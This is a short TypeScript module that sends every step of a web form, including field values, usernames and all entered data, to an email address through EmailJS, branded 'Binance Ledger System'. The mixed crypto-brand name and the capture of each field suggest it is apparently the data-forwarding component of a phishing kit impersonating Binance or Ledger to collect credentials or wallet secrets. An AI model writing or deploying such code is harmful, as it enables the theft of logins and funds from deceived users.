
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from '@/config/emailjs.config';

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
}

export const sendEmailNotification = async (data: EmailData) => {
  try {
    // Format all form data into clean HTML
    let formDataHtml = '';
    if (data.allFormData && typeof data.allFormData === 'object') {
      formDataHtml = Object.entries(data.allFormData)
        .map(([key, value]) => {
          const displayValue = value || 'N/A';
          return `<strong>${key}:</strong> ${displayValue}`;
        })
        .join('<br>');
    }

    // Create a comprehensive message with all information
    const message = `
<h2>🔔 Step: ${data.step}</h2>
<p><strong>Timestamp:</strong> ${data.timestamp}</p>
${data.username ? `<p><strong>Username:</strong> ${data.username}</p>` : ''}

<h3>📋 Form Data:</h3>
${formDataHtml || 'No form data available'}

<hr>
<p><em>Automated notification from Binance Ledger System</em></p>
    `.trim();

    // Use only two simple variables to avoid corruption
    const templateParams = {
      subject: `🚨 ${data.step} - Form Activity`,
      message: message
    };

    console.log('🚨 SENDING EMAIL:', data.step);
    console.log('📧 Template params:', templateParams);

    const result = await emailjs.send(
      EMAILJS_CONFIG.SERVICE_ID,
      EMAILJS_CONFIG.TEMPLATE_ID,
      templateParams,
      EMAILJS_CONFIG.USER_ID
    );

    console.log('✅ Email sent successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send email:', error);
    throw error;
  }
};
